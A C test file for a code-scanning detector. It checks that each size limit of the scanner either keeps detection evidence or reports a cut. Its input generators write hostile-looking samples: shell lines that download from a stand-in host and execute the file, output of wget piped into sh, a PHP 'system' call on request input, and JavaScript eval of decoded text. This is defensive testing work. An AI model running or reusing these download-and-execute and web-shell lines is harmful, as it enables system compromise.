/*
 * genome / diag_text_caps - the INVENTORY OF THE BOUNDS of the TEXT route, each with the way it says that it fired (CLAUDE.md rule 4: a cap bounds cost and must never delete evidence;
 * a hit cap is reported). One row per bound, a text built to sit exactly at it and one just past it:
 *
 *   AT    the bound is not crossed: the evidence is there AND the status says nothing (a report where nothing was lost would make every file that comes near a bound "cut");
 *   PAST  the bound is crossed: the evidence is there, or the scan's status says it was cut - never neither.
 *
 * The rows that were silent before G1..G18 are the ones this fails on in the old code; the rows that were already reported (the evaluator's nesting, the layer allowance) are kept so that the
 * list is the whole list. `evidence` is read off the graph: a node of a capability, or a link between two.
 *
 * usage: diag_text_caps
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <phenotype/diag_scan.h>
#include <celllysis/nucleo.h>

static int fails;

#define CK(c, ...) do { if (!(c)) { printf("  FAIL %s:%d  ", __FILE__, __LINE__); printf(__VA_ARGS__); printf("\n"); fails++; } } while (0)

struct sb {
	char  *p;
	size_t n, cap;
};

static void put(struct sb *b, const char *fmt, ...) __attribute__((format(printf, 2, 3)));

#include <stdarg.h>

static void put(struct sb *b, const char *fmt, ...)
{
	va_list ap;
	char t[4096];
	int n;

	va_start(ap, fmt);
	n = vsnprintf(t, sizeof t, fmt, ap);
	va_end(ap);
	if (n < 0)
		return;
	if (b->n + (size_t)n + 1u > b->cap) {
		b->cap = (b->n + (size_t)n + 1u) * 2u;
		b->p = realloc(b->p, b->cap);
	}
	memcpy(b->p + b->n, t, (size_t)n + 1u);
	b->n += (size_t)n;
}

static void on_const_nop(void *u, uint64_t off, uint64_t len, const uint8_t *v, uint32_t n)
{
	(void)u; (void)off; (void)len; (void)v; (void)n;
}

/* a string the hooks the tests do not link would run: the tests need none of them */
static int apply_none(void *u, const struct kgenome_textual_call *c, const uint8_t *in, uint32_t len, uint8_t *out, uint32_t cap, uint32_t *n)
{
	uint32_t i;

	(void)u;
	if (c->op != KGENOME_TEXTUAL_DEC_REVERSE || len > cap)
		return 0;
	for (i = 0; i < len; i++)
		out[i] = in[len - 1u - i];
	*n = len;
	return 1;
}

struct out {
	int      node;          /* nodes of the wanted capability */
	int      link;          /* links from the first capability to the second */
	int      st;            /* the scan's status */
};

static int count_cap(const struct kgenome_diag_scan *s, uint16_t cap)
{
	uint32_t i;
	int n = 0;

	for (i = 0; i < kgenome_diag_scan_count(s); i++)
		n += kgenome_diag_scan_at(s, i)->cap == cap;
	return n;
}

static int linked(const struct kgenome_diag_scan *s, uint16_t from, uint16_t to)
{
	uint32_t i;
	uint8_t k;

	for (i = 0; i < kgenome_diag_scan_count(s); i++) {
		const struct kgenome_diag_hit *h = kgenome_diag_scan_at(s, i);

		if (h->cap != to)
			continue;
		for (k = 0; k < h->n_in; k++)
			if (kgenome_diag_scan_at(s, h->in[k].from)->cap == from)
				return 1;
	}
	return 0;
}

/* Scan `t` and read the evidence: `cap` nodes (when `to` is 0) or `cap` -> `to` links (when not). */
static struct out look(uint32_t lang, const struct sb *t, int consts, uint16_t cap, uint16_t to)
{
	struct kgenome_diag_text_req rq = { .base = (const uint8_t *)t->p, .size = t->n, .lang = lang, .apply = apply_none };
	struct kgenome_diag_scan *s;
	struct out o = { 0, 0, 0 };

	if (consts)
		rq.on_const = on_const_nop;
	s = kgenome_diag_scan_text(&rq);
	if (!s) {
		o.st = (int)KGENOME_NOMEM;
		return o;
	}
	o.st = (int)kgenome_diag_scan_status(s);
	o.node = count_cap(s, cap);
	o.link = to ? linked(s, cap, to) : 0;
	kgenome_diag_scan_free(s);
	return o;
}

struct row {
	const char *name;
	uint32_t    lang;
	int         consts;
	uint16_t    cap, to;                    /* the evidence: nodes of `cap`, or links cap -> to; 0 when what is lost has no node or link to count (then `report` says so) */
	int         at, past;                   /* the size parameter at the bound and past it */
	void      (*gen)(struct sb *b, int n);
	int         report;                     /* past the bound the status must say so, evidence or not: what a bound drops here is not a thing the graph can show */
};

/* ---- the generators: one size parameter each --------------------------------------------------------------------------- */

/* DEFS: a variable of n producers, then read (`$w = $v`; a sink would add its own bound, the four inputs of a node): the first of n+1 is pushed out, and the read is where it matters */
static void gen_defs(struct sb *b, int n)
{
	int k;

	put(b, "<?php\n");
	for (k = 0; k < n; k++)
		put(b, "$v = base64_decode('%d');\n", k);
	put(b, "$w = $v;\n");
}

/* PDEFS: a function whose variable takes n parameters in turn */
static void gen_pdefs(struct sb *b, int n)
{
	int k;

	put(b, "<?php function f(");
	for (k = 0; k < n; k++)
		put(b, "%s$p%d", k ? ", " : "", k);
	put(b, ") { ");
	for (k = 0; k < n; k++)
		put(b, "$v = $p%d; ", k);
	put(b, "$w = $v; }\nf(");
	for (k = 0; k < n; k++)
		put(b, "%sbase64_decode('%d')", k ? ", " : "", k);
	put(b, ");\n");
}

/* EV_ARGS: String.fromCharCode with n arguments, called as a function */
static void gen_evargs(struct sb *b, int n)
{
	int k;

	put(b, "var f = String.fromCharCode(");
	for (k = 0; k < n; k++)
		put(b, "%s%d", k ? ", " : "", 97 + k % 20);
	put(b, ");\nf(x);\n");
}

/* MAX_PIECES: a chain of n names before a call, `a1.a2. ... an(x)` */
static void gen_pieces(struct sb *b, int n)
{
	int k;

	for (k = 1; k <= n; k++)
		put(b, "%sp%d", k > 1 ? "." : "", k);
	put(b, "(x);\neval(d);\n");
}

/* MAX_STEPS: a chain of n calls, `o.m().m(). ... m()` */
static void gen_steps(struct sb *b, int n)
{
	int k;

	put(b, "o");
	for (k = 0; k < n; k++)
		put(b, ".m()");
	put(b, ";\neval(d);\n");
}

/* CV_ARGS: a command substitution that has n arguments */
static void gen_cvargs(struct sb *b, int n)
{
	int k;

	put(b, "#!/bin/sh\ny=$(echo");
	for (k = 0; k < n; k++)
		put(b, " w%d", k);
	put(b, ")\nwget -O /tmp/f http://e.com/x\nchmod +x /tmp/f\nsh /tmp/f\n");
}

/* CV_ASSIGNS: a command with n assignments in front of it */
static void gen_cvassign(struct sb *b, int n)
{
	int k;

	put(b, "#!/bin/sh\n");
	for (k = 0; k < n; k++)
		put(b, "a%d=%d ", k, k);
	put(b, "wget -O /tmp/f http://e.com/x\nchmod +x /tmp/f\nsh /tmp/f\n");
}

/* CV_NAME: a variable whose name is n bytes long */
static void gen_cvname(struct sb *b, int n)
{
	int k;

	put(b, "#!/bin/sh\n");
	for (k = 0; k < n; k++)
		put(b, "N");
	put(b, "=1\nwget -O /tmp/f http://e.com/x\nchmod +x /tmp/f\nsh /tmp/f\n");
}

/* CV_DEPTH: a chain of n variables, each the next one's (the first is evaluated before the last is known to be a constant) */
static void gen_cvdepth(struct sb *b, int n)
{
	int k;

	put(b, "#!/bin/sh\n");
	for (k = 0; k < n; k++)
		put(b, "a%d=$a%d\n", k, k + 1);
	put(b, "a%d=/tmp/f\nwget -O $a0 http://e.com/x\nchmod +x $a0\nsh $a0\n", n);
}

/* CV_NEST: a command substitution inside n others */
static void gen_cvnest(struct sb *b, int n)
{
	int k;

	put(b, "#!/bin/sh\ny=");
	for (k = 0; k < n; k++)
		put(b, "$(echo ");
	put(b, "x");
	for (k = 0; k < n; k++)
		put(b, ")");
	put(b, "\nwget -O /tmp/f http://e.com/x\nchmod +x /tmp/f\nsh /tmp/f\n");
}

/* NEST_MAX: ruby code inside n strings that each interpolate the next */
static void gen_interp(struct sb *b, int n)
{
	int k;

	put(b, "x = ");
	for (k = 0; k < n; k++)
		put(b, "\"#{");
	put(b, "system('ls')");
	for (k = 0; k < n; k++)
		put(b, "}\"");
	put(b, "\n");
}

/* ARROW_SCAN: an arrow function whose expression body is n tokens long, with the variable of the next statement after it */
static void gen_arrow(struct sb *b, int n)
{
	int k;

	put(b, "var g = (a) => a");
	for (k = 0; k < n; k++)
		put(b, " + a");
	put(b, ";\nvar t = atob(s);\neval(t);\n");
}

/* visible(): n functions nested, the innermost calling a function written at the top */
static void gen_visible(struct sb *b, int n)
{
	int k;

	put(b, "function g(a) { eval(a); }\n");
	for (k = 0; k < n; k++)
		put(b, "function f%d() {\n", k);
	put(b, "g(atob(s));\n");
	for (k = 0; k < n; k++)
		put(b, "}\n");
}

/* the evaluator's nesting: n brackets in a name that is called */
static void gen_evnest(struct sb *b, int n)
{
	int k;

	put(b, "<?php $f = ");
	for (k = 0; k < n; k++)
		put(b, "(");
	put(b, "'system'");
	for (k = 0; k < n; k++)
		put(b, ")");
	put(b, "; $f($_GET[0]);\n");
}

/* the pipeline's carry (ACC_MAX = 8): a segment that made n values, piped on */
static void gen_acc(struct sb *b, int n)
{
	int k;

	put(b, "#!/bin/sh\n");
	for (k = 0; k < n; k++)
		put(b, "echo $(wget -qO- http://e.com/%d) ", k);
	put(b, "| sh\n");
}

static const struct row ROWS[] = {
	{ "variable's producers (DEFS 6)", KGENOME_TEXTUAL_LANG_PHP, 0, 0, 0, 6, 7, gen_defs, 1 },
	{ "variable's slots (PDEFS 4)", KGENOME_TEXTUAL_LANG_PHP, 0, 0, 0, 4, 5, gen_pdefs, 1 },
	{ "evaluator arguments (EV_ARGS 16)", KGENOME_TEXTUAL_LANG_JS, 0, 0, 0, 16, 17, gen_evargs, 1 },
	{ "chain pieces (MAX_PIECES 16)", KGENOME_TEXTUAL_LANG_JS, 0, 0, 0, 16, 17, gen_pieces, 1 },
	{ "chain steps (MAX_STEPS 64)", KGENOME_TEXTUAL_LANG_JS, 0, 0, 0, 10, 100, gen_steps, 1 },
	{ "shell reader arguments (CV_ARGS 16)", KGENOME_TEXTUAL_LANG_SH, 1, KGENOME_NUCLEO_HTTP_FETCH, KGENOME_NUCLEO_PERM_SET, 16, 17, gen_cvargs, 1 },
	{ "shell assignments of a command (CV_ASSIGNS 8)", KGENOME_TEXTUAL_LANG_SH, 1, KGENOME_NUCLEO_HTTP_FETCH, KGENOME_NUCLEO_PERM_SET, 8, 9, gen_cvassign, 1 },
	{ "shell variable name (CV_NAME 200)", KGENOME_TEXTUAL_LANG_SH, 1, KGENOME_NUCLEO_HTTP_FETCH, KGENOME_NUCLEO_PERM_SET, 200, 201, gen_cvname, 1 },
	{ "shell variables in a chain (CV_DEPTH 8)", KGENOME_TEXTUAL_LANG_SH, 1, KGENOME_NUCLEO_HTTP_FETCH, KGENOME_NUCLEO_PERM_SET, 7, 20, gen_cvdepth, 0 },
	{ "shell substitutions in one another (CV_NEST 32)", KGENOME_TEXTUAL_LANG_SH, 1, KGENOME_NUCLEO_HTTP_FETCH, KGENOME_NUCLEO_PERM_SET, 10, 40, gen_cvnest, 1 },
	{ "code in strings in strings (NEST_MAX 4)", KGENOME_TEXTUAL_LANG_RUBY, 0, KGENOME_NUCLEO_EXEC_IMAGE, 0, 3, 6, gen_interp, 1 },
	{ "arrow body (ARROW_SCAN 4096)", KGENOME_TEXTUAL_LANG_JS, 0, 0, 0, 100, 5000, gen_arrow, 1 },
	{ "functions between a call and its callee (4096)", KGENOME_TEXTUAL_LANG_JS, 0, KGENOME_NUCLEO_DECODE, KGENOME_NUCLEO_EVAL, 100, 4200, gen_visible, 0 },
	{ "evaluator nesting (EV_NEST 256)", KGENOME_TEXTUAL_LANG_PHP, 0, 0, 0, 100, 300, gen_evnest, 1 },
	{ "pipeline values (ACC_MAX 8)", KGENOME_TEXTUAL_LANG_SH, 0, 0, 0, 4, 12, gen_acc, 1 },
};

int main(void)
{
	size_t r;

	for (r = 0; r < sizeof ROWS / sizeof ROWS[0]; r++) {
		const struct row *w = &ROWS[r];
		struct sb b = { 0 };
		struct out o;

		int have;

		w->gen(&b, w->at);
		o = look(w->lang, &b, w->consts, w->cap, w->to);
		have = !w->cap || (w->to ? o.link : o.node > 0);
		CK(o.st == (int)KGENOME_OK, "%s: AT the bound (%d) the status is %d (a report where nothing was lost)", w->name, w->at, o.st);
		CK(have, "%s: AT the bound (%d) the evidence is there (%d nodes, %d link)", w->name, w->at, o.node, o.link);
		free(b.p);
		memset(&b, 0, sizeof b);
		w->gen(&b, w->past);
		o = look(w->lang, &b, w->consts, w->cap, w->to);
		have = w->cap && !w->report && (w->to ? o.link : o.node > 0);
		CK(have || o.st != (int)KGENOME_OK, "%s: PAST the bound (%d) the evidence is gone (%d nodes, %d link) and the status says nothing", w->name, w->past, o.node, o.link);
		free(b.p);
	}
	if (fails) {
		printf("diag_text_caps: %d failure(s)\n", fails);
		return 1;
	}
	printf("diag_text_caps: ok\n");
	return 0;
}
